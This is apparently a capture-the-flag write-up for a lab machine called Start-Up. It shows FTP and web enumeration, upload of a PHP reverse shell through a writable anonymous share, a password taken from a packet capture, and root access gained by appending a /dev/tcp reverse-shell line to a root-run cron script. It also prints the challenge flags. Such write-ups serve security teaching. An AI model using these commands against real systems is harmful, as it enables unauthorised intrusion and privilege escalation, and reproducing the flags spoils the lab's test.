![Start-Up](/Easy_Boxes/Start-up/img/1.png)

``ip address: 10.10.130.156``

```r
nmap -sV -A -sC 10.10.130.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 22:19 EST
Nmap scan report for 10.10.130.156
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.6.42.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.55 seconds
```

Let's check ftp server:
```r
ftp 10.10.130.156
Connected to 10.10.130.156.
220 (vsFTPd 3.0.3)
Name (10.10.130.156:dcyberguy): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33212|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||18336|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*********************************************************************************|   208        2.83 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (1.93 KiB/s)
```

Notice.txt reads:
```r
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
We now have a name ``Maya``

Let's try and do from directory brute forcing with ``gobuster``.

```r
gobuster dir -u 10.10.130.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.156
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 314] [--> http://10.10.130.156/files/]
```
Returned to us just this directory listing which is the same as the ftp server listing

Let us try and PUT some random files into the file server
I tired put a file called test.txt into the main ftp server do it did not go through
```r
put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||64462|)
553 Could not create file.
```
Let us try in that ftp directory. And it went through

```r
ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||36206|)
150 Ok to send data.
     0        0.00 KiB/s 
226 Transfer complete.
```

Time to upload a reverse shell and try to get RCE. ``Pentest Monkey``
Update the shell.php to include your ``IP`` and ``PORT NUMBER``

Run netcat to capture the reverse shell connection
``nc -lvp 4444``

```r
Startup nc -lvp 4444      
listening on [any] 4444 ...
10.10.232.226: inverse host lookup failed: Unknown host
connect to [10.6.26.125] from (UNKNOWN) [10.10.232.226] 58966
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:51:38 up 7 min,  0 users,  load average: 0.00, 0.09, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -l
```

We are www-data. Run the file listing command and obtain the recipe.txt file
``Answer:`` love

While doing a file liisting with ls -l, I found a file owned by www-data
```r
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
```
``incidents``
Opened the incident directory and discovered a file called 
``-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng``

Let check whether there is python installed, so that we can transfer the file to our system and dig deep into it
```r
www-data@startup:/incidents$ which python
which python
/usr/bin/python
```
Good, we have python installed. Let us start our python server and transfer it to our local machine for further analysis

```r
www-data@startup:/incidents$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
10.6.26.125 - - [10/Feb/2024 01:16:34] "GET /suspicious.pcapng HTTP/1.1" 200 -
^C
```

then on our local machine we run
```r
wget http://10.10.232.226:8000/suspicious.pcapng
--2024-02-09 20:16:34--  http://10.10.232.226:8000/suspicious.pcapng
Connecting to 10.10.232.226:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31224 (30K) [application/octet-stream]
Saving to: ‘suspicious.pcapng’

suspicious.pcapng            100%[============================================>]  30.49K  --.-KB/s    in 0.1s    

2024-02-09 20:16:34 (307 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
```

Since it is a pcap file, we will use wireshark to open the file.
``Wireshark suspicious.pcapng``

In wireshark use the ``Analyze`` tab and ``follow the TCP stream``

```r
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologi
```
We are able to capture a password:`` c4ntg3t3n0ughsp1c3``

Who has that password? When we ran ``cat /etc/passwd`` we noticed two user accounts
- ``lennie``
- ``ftpsecure``
My best guess: ``lennie``

Let us try and login using ``ssh``
``ssh lennie@10.10.232.226`` and we are in

Do file listing and obtain the user.txt file
``Answer:`` THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

We see a folder called script. That is actually a fine target. We open the scripts folder and notice two files.
```r
cd scripts
$ ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Feb 10 01:52 startup_list.txt
```
let us open the ``planner.sh``

```r
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
We immediately discover another script path /etc/print.sh

Can we plug in our reverse shell script into that path and gain a reverse connection. Let's try:

```r
echo "bash -i >& /dev/tcp/10.6.26.126/5555 0>&1" >> /etc/print.sh
```

run a netcat connection to catch the connection

``nc -lvp 5555``

```r
nc -lvp 5555 
listening on [any] 5555 ...
10.10.232.226: inverse host lookup failed: Unknown host
connect to [10.6.26.125] from (UNKNOWN) [10.10.232.226] 50140
bash: cannot set terminal process group (2192): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
planner.sh
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
root@startup:~# 
```
Root.txt: ``THM{f963aaa6a430f210222158ae15c3d76d}``

